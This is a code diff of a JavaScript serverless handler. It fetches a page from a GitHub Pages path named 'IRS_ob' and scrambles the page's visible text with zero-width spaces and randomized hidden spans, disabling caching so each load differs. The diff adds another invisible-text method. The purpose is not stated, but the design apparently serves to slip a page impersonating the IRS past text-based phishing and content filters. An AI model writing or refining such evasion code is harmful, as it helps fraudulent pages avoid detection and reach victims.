@@ -3,16 +3,15 @@ import fetch from "node-fetch";
 // Function to generate random obfuscation patterns
 function randomObfuscationPattern() {
     const obfuscationMethods = [
+        (char) => `${char}&#x200B;`, // Zero-width space
         (char) => `${char}<span style="display:none">${Math.random().toString(36).substring(2, 6)}</span>`, // Hidden text
         (char) => `${char}<span style="font-size:0">${Math.random().toString(36).substring(2, 6)}</span>`, // Invisible text
-        (char) => `${char}&#x200B;`, // Zero-width space
-        (char) => `${char}<span style="opacity:0">${Math.random().toString(36).substring(2, 6)}</span>` // Invisible text
+        (char) => `${char}<span style="width:0;height:0;overflow:hidden">${Math.random().toString(36).substring(2, 6)}</span>` // Invisible hidden text
     ];
-    
     return obfuscationMethods[Math.floor(Math.random() * obfuscationMethods.length)];
 }
 
-// Function to obfuscate text using random techniques
+// Function to obfuscate text **without altering HTML tags**
 function obfuscateText(text) {
     return text.replace(/([a-zA-Z0-9])/g, (match) => {
         const obfuscateMethod = randomObfuscationPattern();
@@ -23,16 +22,19 @@ function obfuscateText(text) {
 // API Handler to serve obfuscated HTML
 export default async function handler(req, res) {
     try {
-        // Fetch original HTML from GitHub Pages (Replace with actual URL)
+        // Fetch the original HTML (Replace with your actual URL)
         const response = await fetch("https://mightyflavor.github.io/obfuscationnn/IRS_ob"); // Replace with actual URL
         let html = await response.text();
 
-        // Randomly obfuscate all visible text
+        // Preserve HTML structure, obfuscating only text content inside tags
         let modifiedHTML = html.replace(/>([^<]+)</g, (match, text) => {
-            return ">" + obfuscateText(text) + "<";
+            if (text.trim() !== "") {
+                return ">" + obfuscateText(text) + "<"; // Obfuscate text inside tags
+            }
+            return match; // Leave empty tags unchanged
         });
 
-        // Set cache-control headers to prevent browser caching
+        // Set cache-control headers to prevent caching & ensure fresh obfuscation on each reload
         res.setHeader("Content-Type", "text/html");
         res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
         res.setHeader("Expires", "0");
@@ -44,4 +46,5 @@ export default async function handler(req, res) {
         return res.status(500).send("Error fetching or modifying HTML.");
     }
 }
+
 
